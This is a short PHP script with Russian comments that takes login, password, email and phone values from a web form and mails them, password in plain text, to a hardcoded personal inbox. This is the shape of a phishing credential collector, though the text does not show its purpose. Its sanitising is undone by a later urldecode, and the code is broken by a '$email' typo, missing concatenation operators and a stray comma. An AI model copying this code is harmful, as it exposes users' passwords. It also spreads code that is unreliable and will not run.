<?php
//получим данные с элементов формы
$login = $_POST['login'];
$pass = $_POST['pass'];
Semail = $_POST['email'];
$tel = $_POST['tel'];
//обработаем полученные данные
$login = htmlspecialchars($login); 
$pass  = htmlspecialchars($pass);
$email = htmlspecialchars($email);
$tel   = htmlspecialchars($tel);


$login = urldecode($login); 
$pass  = urldecode($pass);
$email = urldecode($email);
$tel   = urldecode($tel);


$login = trim($login); 
$pass  = trim($pass);
$email = trim($email);
$tel   = trim($tel);


if (mail("momot.vova@inbox.ru",
"Новое письмо с сайта",
"Логин: " $login "\n".
 "Пароль: " $pass."\n". 
 "Email: " $email "\n".
"Телефон:" $tel,"\n". 
"From: momot.vova@inbox.ru \r\n")
) {
echo ('Письмо успешно отправлено!');
}
else { 
    echo ('Есть ошибки! Проверьте данные…');
}





?>
